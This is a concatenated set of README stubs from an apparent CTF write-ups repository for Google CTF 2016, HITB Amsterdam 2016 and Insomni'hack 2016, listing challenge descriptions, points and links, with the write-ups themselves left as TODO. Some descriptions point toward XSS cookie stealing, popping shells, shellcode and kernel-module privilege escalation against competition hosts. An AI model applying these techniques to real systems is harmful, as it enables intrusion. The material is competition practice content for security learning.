* https://github.com/Blystad/googlectf_writeups/tree/master/networking/opabina_regalis_token_fetch
* http://b0tchsec.com/2016/googlectf/opabina-regalis-token-fetch
# google-ctf-2016 : networking

**Category:** Networking
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 write-ups

* [Scoreboard](https://capturetheflag.withgoogle.com/scoreboard) or [local alternative](scoreboard)

## Completed write-ups

* [mobile/little-bobby-application-250](mobile/little-bobby-application-250)

## External write-ups only

* [reverse/audio-visual-reciever-code-150](reverse/audio-visual-reciever-code-150)
* [reverse/unbreakable-enterprise-product-activation-150](reverse/unbreakable-enterprise-product-activation-150)
* [networking/opabina-regalis-ssl-stripping-75](networking/opabina-regalis-ssl-stripping-75)
* [networking/opabina-regalis-downgrade-attack-100](networking/opabina-regalis-downgrade-attack-100)
* [networking/opabina-regalis-redirect-100](networking/opabina-regalis-redirect-100)
* [networking/opabina-regalis-input-validation-100](networking/opabina-regalis-input-validation-100)
* [networking/opabina-regalis-token-fetch-50](networking/opabina-regalis-token-fetch-50)
* [homework/jump-outdated-elephants-15](homework/jump-outdated-elephants-15)
* [homework/need-feedback-300](homework/need-feedback-300)
* [homework/jekyll-15](homework/jekyll-15)
* [crypto/eucalypt-forest-100](crypto/eucalypt-forest-100)
* [crypto/woodman-100](crypto/woodman-100)
* [crypto/rsacalc-300](crypto/rsacalc-300)
* [crypto/spotted-wobbegong-100](crypto/spotted-wobbegong-100)
* [crypto/wolf-spider-125](crypto/wolf-spider-125)
* [forensics/in-recorded-conversation-25](forensics/in-recorded-conversation-25)
* [forensics/no-big-deal-part-2-250](forensics/no-big-deal-part-2-250)
* [forensics/for2-200](forensics/for2-200)
* [forensics/magic-code-250](forensics/magic-code-250)
* [forensics/for1-100](forensics/for1-100)
* [forensics/a-cute-stegosaurus-100](forensics/a-cute-stegosaurus-100)
* [forensics/no-big-deal-50](forensics/no-big-deal-50)
* [mobile/can-you-repo-it-5](mobile/can-you-repo-it-5)
* [mobile/ill-intentions-150](mobile/ill-intentions-150)
* [exploitation/forced-puns-125](exploitation/forced-puns-125)
* [web/horton-hears-a-who-100](web/horton-hears-a-who-100)
* [web/dancing-dingoes-150](web/dancing-dingoes-150)
* [web/weedy-sea-dragon-150](web/weedy-sea-dragon-150)
* [web/geokitties-250](web/geokitties-250)
* [web/wallowing-wallabies-part-two-50](web/wallowing-wallabies-part-two-50)
* [web/global-ctf-200](web/global-ctf-200)
* [web/purple-wombats-100](web/purple-wombats-100)
* [web/ernst-echidna-50](web/ernst-echidna-50)
* [web/flag-storage-service-175](web/flag-storage-service-175)
* [web/wallowing-wallabies-part-three-150](web/wallowing-wallabies-part-three-150)
* [web/wallowing-wallabies-part-one-25](web/wallowing-wallabies-part-one-25)
* [web/final-destination-200](web/final-destination-200)
* [web/spotted-quoll-50](web/spotted-quoll-50)
* [web/fss-electric-boogaloo-100](web/fss-electric-boogaloo-100)

## Missing write-ups

* [reverse/leeky-pipes-protected-secrets-100](reverse/leeky-pipes-protected-secrets-100)
* [reverse/explosive-decompression-125](reverse/explosive-decompression-125)
* [reverse/leeky-pipes-user-manager-200](reverse/leeky-pipes-user-manager-200)
* [reverse/guess-me-300](reverse/guess-me-300)
* [homework/sand-blocks-15](homework/sand-blocks-15)
* [homework/prison-break-100](homework/prison-break-100)
* [homework/time-to-go-150](homework/time-to-go-150)
* [homework/remote-pwnage-call-15](homework/remote-pwnage-call-15)
* [homework/tie-dye-socks-32-bit-rce-100](homework/tie-dye-socks-32-bit-rce-100)
* [homework/jail-break-100](homework/jail-break-100)
* [homework/eastern-digital-15](homework/eastern-digital-15)
* [homework/pound-cake-15](homework/pound-cake-15)
* [homework/tie-dye-socks-15](homework/tie-dye-socks-15)
* [homework/bonafortuna-443-15](homework/bonafortuna-443-15)
* [homework/tie-dye-ftpd-100](homework/tie-dye-ftpd-100)
* [homework/tie-dye-socks-64-bit-rce-100](homework/tie-dye-socks-64-bit-rce-100)
* [homework/bonafortuna-1194-15](homework/bonafortuna-1194-15)
* [crypto/rich-man-300](crypto/rich-man-300)
* [exploitation/leeky-pipes-bad-log-200](exploitation/leeky-pipes-bad-log-200)
* [exploitation/gulbaru-gecko-400](exploitation/gulbaru-gecko-400)
* [exploitation/tin-roof-150](exploitation/tin-roof-150)
* [exploitation/silent-raindrops-300](exploitation/silent-raindrops-300)
# google-ctf-2016 : audio-visual-reciever-code-150

**Category:** Reverse
**Points:** 150
**Solves:** 96
**Description:**
Can you find the code?

audio_visual_receiver_code

## Write-up

(TODO)

## Other write-ups and resources

* P1kachu (Team LSE) <http://p1kachu.pluggi.fr/writeup/re/2016/05/01/googlectf-audio-visual-writeup/>
* https://0x90r00t.com/2016/05/02/google-capture-the-flag-2016-reverse-150-audio-visual-receiver-code-write-up/
* https://github.com/ret2libc/ctfs/tree/master/googlectf2016/audio_visual_receiver
# google-ctf-2016 : explosive-decompression-125

**Category:** Reverse
**Points:** 125
**Solves:** 4
**Description:**
Can you survive decompression? Running on ssl-added-and-removed-here.ctfcompetition.com:17732. Don't forget to account for SSL off-loading.

Flag is in /flag.

Check out out resources.

explosive-decompression.tar.gz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : guess-me-300

**Category:** Reverse
**Points:** 300
**Solves:** 1
**Description:**

This challenge provides quite the MOVing experience. You may connect to this service on ssl-added-and-removed-here.ctfcompetition.com:65519. Don't forget to account for SSL offloading.

guessme-public.xz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : leeky-pipes-protected-secrets-100

**Category:** Reverse
**Points:** 100
**Solves:** 8
**Description:**
Can you fetch /protected/secrets from ssl-added-and-removed-here.ctfcompetition.com:20001 -- don't forget to account for the SSL offloading :)


leeky-pipes-fixed.tgz

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : leeky-pipes-user-manager-200

**Category:** Reverse
**Points:** 200
**Solves:** 1
**Description:**
Are you able to extract the flag from the User Manager component of Leeky Pipes?

ssl-added-and-removed-here.ctfcompetition.com:20001

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : reverse

**Category:** Reverse
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : unbreakable-enterprise-product-activation-150

**Category:** Reverse
**Points:** 150
**Solves:** 108
**Description:**
We need help activating this product -- we've lost our license key :(

You're our only hope!

unbreakable-enterprise-product-activation.bz2

## Write-up

(TODO)

## Other write-ups and resources

* P1kachu (Team LSE) <http://p1kachu.pluggi.fr/writeup/re/2016/05/01/googlectf-unbreakable-writeup/>
* https://github.com/TUCTF/write-ups-2015/blob/master/GoogleCTF/RE/RE150-Unbreakable-Product-Activation/solve.py
* http://www.99cruster.com/blog/2016/05/02/google-ctf-2016-unbreakable-enterprise-product-activation-writeup-using-angr/
* http://hack.carleton.team/2016/05/05/google-ctf-2016-unbreakable-enterprise-product-activation-150-points/
# google-ctf-2016 : dancing-dingoes-150

**Category:** Web
**Points:** 150
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-4-dancing-dingoes/
# google-ctf-2016 : ernst-echidna-50

**Category:** Web
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://github.com/bl4de/ctf/tree/master/2016/Google_CTF_2016/Ernst_Echidna_Web_50
* http://countersite.org/articles/web-vulnerability/82-google-ctf-2016-web-taski.html
* http://www.slideshare.net/sehanlee7/googlectf-2016-ernst-echidna-writeup-verkorean
* http://solorab.net/blog/2016/05/02/google-ctf-2016-ernst-echidna/
# google-ctf-2016 : final-destination-200

**Category:** Web
**Points:** 200
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://thegoonies.rocks/google-ctf-final-destination-web/
# google-ctf-2016 : flag-storage-service-175

**Category:** Web
**Points:** 175
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-11-flag-storage-service
# google-ctf-2016 : fss-electric-boogaloo-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-12-fss-electric-boogaloo/
# google-ctf-2016 : geokitties-250

**Category:** Web
**Points:** 250
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* https://twitter.com/k_firsov/status/726841516174508033
# google-ctf-2016 : global-ctf-200

**Category:** Web
**Points:** 200
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-8-global-ctf
# google-ctf-2016 : horton-hears-a-who-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-15-horton-hears-a-who/
# google-ctf-2016 : purple-wombats-100

**Category:** Web
**Points:** 100
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-6-purple-wombats/
# google-ctf-2016 : web

**Category:** Web
**Points:** 
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* none yet
# google-ctf-2016 : spotted-quoll-50

**Category:** Web
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-7-spotted-quoll
* http://solorab.net/blog/2016/05/02/google-ctf-2016-spotted-quoll/
* https://github.com/bl4de/ctf/tree/master/2016/Google_CTF_2016/Spotted_Quoll_Web_50
* http://b0tchsec.com/2016/googlectf/spotted-quoll
* http://countersite.org/articles/web-vulnerability/85-web-googlecft2016-spotted-quoll.html
* http://fadec0d3.blogspot.com/2016/05/google-ctf-2016-various-no-big-deal-pt.html
# google-ctf-2016 : wallowing-wallabies-part-one-25

**Category:** Web
**Points:** 25
**Solves:** 314
**Description:**
Wallowing Wallabies provides enterprise contract management - we'd like to find out how easy it is to perform corporate espionage against them. Visit them here <https://wallowing-wallabies.ctfcompetition.com/>.

Please note Please do not run automated scanners against the target - that's not the intended solution. Instead, perhaps look up "xss cookie catching", "xss cookie stealing" and other documents along those lines. Thanks!

## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-1-wallowing-wallabies-part-one/
* https://github.com/bl4de/ctf/tree/master/2016/Google_CTF_2016/Wallowing_Wallabies_Web_25
* http://countersite.org/83-web-writeup-googlectf-wallowing-wallabies.html
* http://www.slideshare.net/sehanlee7/googlectf-2016-wallowing-wallabies-part-one-writeup-verkorean
# google-ctf-2016 : wallowing-wallabies-part-three-150

**Category:** Web
**Points:** 50
**Solves:** 155
**Description:**
Time to brush off those XSS skills again in a new part of the page! Same website as before <https://wallowing-wallabies.ctfcompetition.com/>

## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-5-wallowing-wallabies-part-three/
* http://countersite.org/83-web-writeup-googlectf-wallowing-wallabies.html
# google-ctf-2016 : wallowing-wallabies-part-two-50

**Category:** Web
**Points:** 50
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://buer.haus/2016/05/01/google-ctf-web-2-wallowing-wallabies-part-two
* http://countersite.org/83-web-writeup-googlectf-wallowing-wallabies.html
# google-ctf-2016 : weedy-sea-dragon-150

**Category:** Web
**Points:** 150
**Solves:** 
**Description:**



## Write-up

(TODO)

## Other write-ups and resources

* http://blog.eqoe.cn/posts/google-ctf-2016-part2.html
# HITB CTF Amsterdam 2016 : setting-the-table-200

**Category:** Crypto
**Points:** 200
**Solves:** 
**Description:**

Presentation of a meal is an important part of the restaurant experience. Show your table setting skills here: 145.111.225.61:37373. If you feel lost, you can find the basic table setting manual here: [download](https://github.com/ctfs/write-ups-2016/tree/master/hitb-ctf-amsterdam-2016/crypto/setting-the-table-200/soup_meat_tea.c)



## Write-up

(TODO)

## Other write-ups and resources

* https://ced.pwned.systems/hitb-2016-ctf-misc200-setting-the-table.html
# HITB CTF Amsterdam 2016 : good-for-sources-100

**Category:** Network
**Points:** 100
**Solves:** 
**Description:**

Shopping for ingredients is a true challenge and often requires going to several shops and distributors. We have recorded one of our resident Chefs’ routine shopping streaks. Can you discover which dish he prepared?

You can get the recording here: [download](https://ced.pwned.systems/downloads/hitb-2016-ctf/net100/hitb_03c5e9da492b6f0b71c0bb0dc76323be3b452eafa61629d0dccf5b5da590390c.pcap)

## Write-up

(TODO)

## Other write-ups and resources

* https://ced.pwned.systems/hitb-2016-ctf-net100-good-food-sources.html
# HITB CTF Amsterdam 2016 : stone-soup-100

**Category:** Pwn
**Points:** 100
**Solves:** 
**Description:**

Nowadays in the times of cyber warfare it is important that code provided by attackers is executed in a safe way. Our shellcode prevention technology, dubbed “stone soup”, has provided us with years of sekjurity. You’ll find this service to be running on 145.111.225.50:33533.

Source code for this service is available [here](https://github.com/ctfs/write-ups-2016/tree/master/hitb-ctf-amsterdam-2016/pwn/stone-soup-100/stone_soup.py).



## Write-up

(TODO)

## Other write-ups and resources

* https://ced.pwned.systems/hitb-2016-ctf-bin100-stone-soup.html
# HITB CTF Amsterdam 2016 write-ups

* <https://conference.hitb.org/hitbsecconf2016ams/capture-the-flag/>
* [Scoreboard](TODO) or [local alternative](scoreboard)

## Repo-local write-ups

* none yet

## External write-ups only

* [reversing/lost-in-translation-300](reversing/lost-in-translation-300)
* [pwn/stone-soup-100](pwn/stone-soup-100)
* [network/good-for-sources-100](network/good-for-sources-100)
* [crypto/setting-the-table-200](crypto/setting-the-table-200)
* [web/kitchen-on-a-kitchen-400](web/kitchen-on-a-kitchen-400)
* [web/jamies-chef-layers-300](web/jamies-chef-layers-300)

## Missing write-ups

* none yet
# HITB CTF Amsterdam 2016 : lost-in-translation-300

**Category:** Reversing
**Points:** 300
**Solves:** 
**Description:**

Running a restaurant in a touristic trap like Amsterdam means you sometimes have to deal with customers that do not seem to speak your language. Customers where, no matter what you try, everything seems to fall on deaf ears. We have found such a customer for you.
Can you find out what he'd like to eat?  You can talk to him on ip: <ctf network service ip>

## Write-up

(TODO)

## Other write-ups and resources

* http://gnoobz.com/hitb-ctf-2016-binary-300.html
# HITB CTF Amsterdam 2016 : jamies-chef-layers-300

**Category:** Web
**Points:** 300
**Solves:** 
**Description:**

It appears this system holds a secret recipe from top chef Jamie, but it can only beaccessed by himself. Can you find a way to get to it? http://145.111.225.36

No bruteforcing is required.

## Write-up

(TODO)

## Other write-ups and resources

* https://ced.pwned.systems/hitb-2016-ctf-web300-jamies-chef-layers.html
# HITB CTF Amsterdam 2016 : kitchen-on-a-kitchen-400

**Category:** Web
**Points:** 400
**Solves:** 
**Description:**

Kitchens come in many shapes and sizes, some more surprising than others. One of our resident chefs has taken some common kitchen instruments and used them to create a Kitchen on a Kitchen. Do you have the skills to adapt to its style? Try the kitchen here: http://145.111.225.73/

Flag format is “HITB{” + md5(answer) + “}”



## Write-up

(TODO)

## Other write-ups and resources

* https://ced.pwned.systems/hitb-2016-ctf-spc400-kitchen-on-a-kitchen.html
# Insomni'hack CTF 2016 : Smartdoor1

**Category:** Backdoor
**Author:** clZ
**Difficulty:** Easy
**Description:**

> Your neighbor Fred has just installed this new connected front door. He has been bragging about how he can open it from far away and all... Who cares right?
> Well I think we should teach him a lesson. Can you find a way into his new door?
> I've found the door's firmware here: smartdoor1_2ed98791bd003533dc8b4b5ea79a6656
> And the door itself seems to be accessible here: smartdoor1.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Smartdoor2

**Category:** Backdoor
**Author:** clZ
**Difficulty:** Medium
**Description:**

> Your other neighbor Julia has decided to install another kind of smart door! Wtf is happening to your neighborhood?
> Show her her mistake by breaking in!
> Again, we were able to get the firmware: smartdoor2_2ceb2e595d5f58fa55297e2e1bbc274b
> The door is here: smartdoor2.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Smartdoor3

**Category:** Backdoor
**Author:** clZ
**Difficulty:** Medium
**Description:**

> Looks like despite all your hacking, people are still buying smart connected doors. The latest super secure version has been installed at Frank's place.
> Here's the firmware: smartdoor3_6c931f4d5090f6a360bee7db3681c0d3
> And the door is here: smartdoor3.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : PCAPBleeding

**Category:** Crypto
**Author:** julien 
**Difficulty:** Medium
**Description:**

> Finally, somebody has read our 2014 log files. We think an attack occurred on our HTTPS server but we don't know if they succeed in stealing valuable information. Some confidential data pass through this SSL channels so we hope it's not broken :~ 
> 
> The flag format is INS={some random string here}. 
> 
> [pcapbleeding](./pcapbleeding_0c5102ad4b1c035b40f501a3e5b7d4f8.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <http://cybermashup.com/2016/03/21/insomnihack-2016-pcapbleeding-writeup/>
* <https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/crypto/pcapbleeding>
* <https://duksctf.github.io/Inso2016-pcapbleeding/>
# Insomni'hack CTF 2016 : 128k

**Category:** Hardware
**Author:** ch
**Difficulty:** Hard
**Description:**

> What a cheap IoT ! $6 CPU, 128k RAM, 1MB flash.
> Use a cheap exploit for this. 
> Download the flash image [here](./128k_774be1a9b3ee62f2bc940a575e81c5b0.elf) and exploit it @ root table

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : DrUnk4lyZer I

**Category:** Hardware
**Author:** azox
**Difficulty:** Medium
**Description:**

> Come and have a pint, let's see if you'll blow up the score ! 
>
> Challenge file [here](./DrUnk4lyZer_355ee32647a9c9e1e90aef49d9a854c4.bin) 
> Schema [here](./schema_a951bdd9bfa9a4689fd7436354142ae6.jpg) 
>
> When ready come @ root table, flag format INS<flag>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : DrUnk4lyZer II

**Category:** Hardware
**Author:** azox
**Difficulty:** Medium
**Description:**

> Ready for next round ? Tonight drinks are on me ! 
> 
> Challenge file still the same 
> 
> When ready come @ root table, flag format INS<flag>

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : IoTcode

**Category:** Hardware
**Author:** Britney
**Difficulty:** Medium
**Description:**

> Here is a compressed copy of the user partition of a Windows 10 Core IoT running on a Raspberry Pi 2. Find what you have to do and test your answer with the Raspberry Pi on the desk of the organizers. iotcode_8dfe573cdbccd541375408706d2c583c.zip
> 
> The flag is in the form INS{something_in_small_caps} 
> 
> Notes:
> - You have to validate the code with the Raspberry Pi on the desk of the organizers because the flag is slightly different from the version in the executable you have.
> - This challenge was prepared by Tom, 12 years old.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : robots

**Category:** Misc
**Author:** awe
**Difficulty:** Medium
**Description:**

> Survive the robot uprising and steal their secret flag!
> Service running on robots.insomni.hack:4242

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/misc/Robots>
* <https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/misc_robots>
# Insomni'hack CTF 2016 : smartcat0

**Category:** Misc
**Author:** grimmlin
**Difficulty:** Easy
**Description:**

> This is yet another follow-up to our smartcat challenge at the Insomni'hack Teaser.
> 
> URL: http://smartcat0.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/web_smartcat0>
# Insomni'hack CTF 2016 : smartcat3

**Category:** Misc
**Author:** awe
**Difficulty:** Medium
**Description:**

> This is a follow-up to our smartcat challenge at the Insomni'hack Teaser.
> Get a shell to obtain the flag!
> 
> URL: http://smartcat3.insomni.hack/cgi-bin/ping.cgi

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/misc/Smartcat3>
* <https://github.com/p4-team/ctf/tree/master/2016-03-18-insomnihack-final/web_smartcat3>
* <http://0xecute.com/index.php/2016/03/21/insomnihack-2016-smartcat-3/>
# Insomni'hack CTF 2016 : smartips

**Category:** Network
**Author:** julien
**Difficulty:** Easy
**Description:**

> Our smartcat was not so secure so we decided to add a powerful homemade smart IPS. No chance for you to have a flag now! :-) 
> 
> smartips

## Write-up

(TODO)

## Other write-ups and resources

* <https://github.com/hexpresso/WU-2016/tree/master/insomnihack-ctf-2016/network/Smartips>
# Insomni'hack CTF 2016 : bIoTch slap

**Category:** Pwn
**Author:** grimmlin
**Difficulty:** Medium
**Description:**

> Ever dreamt about slapping someone in the face across the Internet ?
> Deam no more! 
> running on biotchslap.insomni.hack:1070 with -nx, not chrooted
> Challenge files [here](./biotchslap_0a6e6e44b0123f4c8c232215f3675e57.tgz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : CC232

**Category:** Pwn
**Author:** julien
**Difficulty:** Medium
**Description:**

> A new botnet was discovered on our honeypot! I give you the malware if you want to take a look. 
> 
> [cc232](./bot_cb1ef0b3f4690233914232d0ca606f42.jar)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Microwave

**Category:** Pwn
**Author:** drp3ab0dy
**Difficulty:** Easy
**Description:**

> Baby's first to warm up your night!
> 
> Service running on microwave.insomni.hack:1337 
> 
> Get the file [microwave](./microwave_61f50dba931bb10ab3089215b2e188f4.tgz) 

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.reverser.ninja/2016/20/insomnihack-2016-microwave-writeup.html>
* <https://deadc0de.re/articles/microwave-write-up.html>
* <https://duksctf.github.io/Inso2016-microwave/>
# Insomni'hack CTF 2016 : Retoasted

**Category:** Pwn
**Author:** grimmlin
**Difficulty:** Hard
**Description:**

> Oh noes, toasted again!
> This is the _exact_ same challenge as this year's quals, but qemu got pimped a bit. 
> 
> running on retoasted.insomni.hack:7200 
> 
> You can grab the [challenge files](./retoasted_fe6ac5df080b5a1902c03521e69f85da.tgz) and enjoy some new qemu features such as NX, ASLR, PIE and W^X.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : rootkit

**Category:** Pwn
**Author:** awe
**Difficulty:** Hard
**Description:**

> Our router seems to have a weird kernel module installed... Abuse it to get root!
> 
> ssh rootkit@rootkit.insomni.hack
> Password: flag of "microwave"
> 
> [Challenge files](./rootkit-305d6c20e4cb91db1e0bc162b0e016a4.tar.bz2)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Smartstove

**Category:** Pwn
**Author:** drp3ab0dy
**Difficulty:** Easy
**Description:**

> Have you already tried my new smart stove?!
> 
> Service running on smartstove.insomni.hack:1234 
> 
> Get the file [smartstove](./smartstove_84b5412d0236f23485082ee98a2b3d36) 

## Write-up

(TODO)

## Other write-ups and resources

* <http://blog.reverser.ninja/2016/20/insomnihack-2016-smartstove-writeup.html>
# Insomni'hack CTF 2016 write-ups

* <https://insomnihack.ch/>
* [Scoreboard](https://twitter.com/1ns0mn1h4ck/status/711024976611123201/photo/1) or [local alternative](./scoreboard.jpg)

## Repo-local write-ups

* none yet

## External write-ups only

* [crypto/pcapbleeding](crypto/pcapbleeding)
* [misc/robots](misc/robots)
* [misc/smartcat0](misc/smartcat0)
* [misc/smartcat3](misc/smartcat3)
* [network/smartips](network/smartips)
* [pwn/microwave](pwn/microwave)
* [pwn/smartstove](pwn/smartstove)
* [reverse/safecrt2](reverse/safecrt2)

## Missing write-ups

* [backdoor/smartdoor1](backdoor/smartdoor1)
* [backdoor/smartdoor2](backdoor/smartdoor2)
* [backdoor/smartdoor3](backdoor/smartdoor3)
* [hardware/128k](hardware/128k)
* [hardware/drunk4lyzer-i](hardware/drunk4lyzer-i)
* [hardware/drunk4lyzer-ii](hardware/drunk4lyzer-ii)
* [hardware/iotcode](hardware/iotcode)
* [pwn/biotch-slap](pwn/biotch-slap)
* [pwn/cc232](pwn/cc232)
* [pwn/retoasted](pwn/retoasted)
* [pwn/rootkit](pwn/rootkit)
* [reverse/megafat](reverse/megafat)
* [reverse/rostinator](reverse/rostinator)
* [shellcode/superpollute](shellcode/superpollute)
* [web/greenbox](web/greenbox)
* [web/ibeer](web/ibeer)
* [web/netfondue](web/netfondue)
* [web/overview-of-ideas-i](web/overview-of-ideas-i)
* [web/overview-of-ideas-ii](web/overview-of-ideas-ii)
* [web/secretsafe](web/secretsafe)
* [web/smarttoothpick](web/smarttoothpick)
* [web/the-revenge-of-jack-the-clicker](web/the-revenge-of-jack-the-clicker)
* [web/tmon](web/tmon)# Insomni'hack CTF 2016 : megafat

**Category:** Reverse
**Author:** ch
**Difficulty:** Medium
**Description:**

> You got a free smart light switch, but even basic features are optional! 
> Create valid license keys for every stuff. 
> Get the registration software [here](./megafat_5ad3f8b7114cc658ecb3ec14dc8ea23c)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Rostinator

**Category:** Reverse
**Author:** drp3ab0dy 
**Difficulty:** Medium
**Description:**

> How is up for some nice rösti!?
> 
> 
> Get the file [rostinator](./rostinator_cd18ee1c4f99af231a96f3573cd801eb) 

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : SafeCRT2

**Category:** Reverse
**Author:** julien 
**Difficulty:** Medium
**Description:**

> You have found a file protected using the Android application SafeCRT2. Try to recover the file's content! 
> 
> [safecrt2](./safecrt2_dcd368339aef3c8cf2cf6db2d3754d71.zip)

## Write-up

(TODO)

## Other write-ups and resources

* <https://tasteless.eu/post/2016/03/insomnihack-safecrt/>
# Insomni'hack CTF 2016 : Superpollute

**Category:** Shellcode
**Author:** grimmlin
**Difficulty:** Medium
**Description:**

> So, I built this connected, self-driving car in my garage, but I used an existing motor engine to do it. The model tag is still present in memory but I really need it to be changed. Fortunately, I left this service open in order to apply small firmware patches, so send it a shellcode to find and change the tag present somewhere in memory 
> running on superpollute.insomni.hack:24607 
> [challenge files](./superpollute_3d207334a64646b266eb44ec6a9e1e31.tgz) 
>
> HINT1 : you might need this to develop your shellcode
>
> HINT2 : gdb inside qemu-system is _broken_ on sh4. Use qemu-sh4 with -g and use a native gdb with multitarget support.

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : GreenBox

**Category:** Web
**Author:** agix
**Difficulty:** Hard
**Description:**

> Multiple hackers pop a shell on my last greenbox version... This time I upgraded to nodeJS v5.8.0 and removed Object from the sandbox to prevent exploitation.
> 
> I hope you won't find another way to pop a shell !
> 
> Greenbox
> [Sources](./greenbox_7853dc6152821281e2b44e00c7534727.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : iBeer

**Category:** Web
**Author:** agix 
**Difficulty:** Medium
**Description:**

> Take a break, drink a beer with you friends !
> 
> SoMuchBeer
> 
> [Sources](./somuchbeer_9ca44d5c0774e815bce7d2e60091f362.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : NetFondue

**Category:** Web
**Author:** Gaël
**Difficulty:** Easy
**Description:**

> Share a convivial fondue by using our new smart caquelon. People are finally brought together thanks to technology !
> 
> URL: http://netfondue.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : OverView of Ideas I

**Category:** Web
**Author:** agix
**Difficulty:** Hard
**Description:**

> Please send us your best ideas for our new connected object prototypes !
> 
> Sorry for the Crappy website
> 
> [Sources](./idea_58ad264f2fb7a03e165f7022e72eb8e3.tar.gz)

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : OverView of Ideas II

**Category:** Web
**Author:** agix
**Difficulty:** Hard
**Description:**

> This one is hard !
> 
> Same website
> 
> I heard there is a secret in C:\Share\flag

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : Secretsafe

**Category:** Web
**Author:** clZ
**Difficulty:** Easy
**Description:**

> Uho, I seem to have lost the key to my safe. Maybe you can help me find it?
> http://secretsafe.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : smarttoothpick

**Category:** Web
**Author:** Gaël 
**Difficulty:** Medium
**Description:**

> Next generation toothpick powered by next generation programming language ! Never miss an olive again !
> 
> URL : http://smarttoothpick.insomni.hack

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : The revenge of jack the clicker

**Category:** Web
**Author:** clZ 
**Difficulty:** Medium
**Description:**

> You might remember Jack from last year? Well he's still in a clicking mood!
> Except this year, he has developed an online alcohol tester. Who would have ever thought of that?
> Do you think you can find a way to the admin page?
> Here is the app

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack CTF 2016 : TMon

**Category:** Web
**Author:** azox 
**Difficulty:** Easy
**Description:**

> Alice lost the master admin password of the corporate toilets monitoring platform. Maybe you can help recover it ? 
> 
> user: alice password: IloveBob 
> connect here

## Write-up

(TODO)

## Other write-ups and resources

* none yet
# Insomni'hack Teaser CTF 2016 : Bring the noise

**Category:** Crypto
**Points:** 200
**Author:** veorg
**Solves:** 173
**Description:**

> Quantum computers won't help you
> 
> [Source](./server-bd6a6586808ab28325de37276aa99357.py)
> 
> Running on: bringthenoise.insomnihack.ch:1111


## Write-up

(TODO)

## Other write-ups and resources

* <https://ctf.rip/insomnihack-teaser-2016-bring-the-noise-crypto-200-pts/>
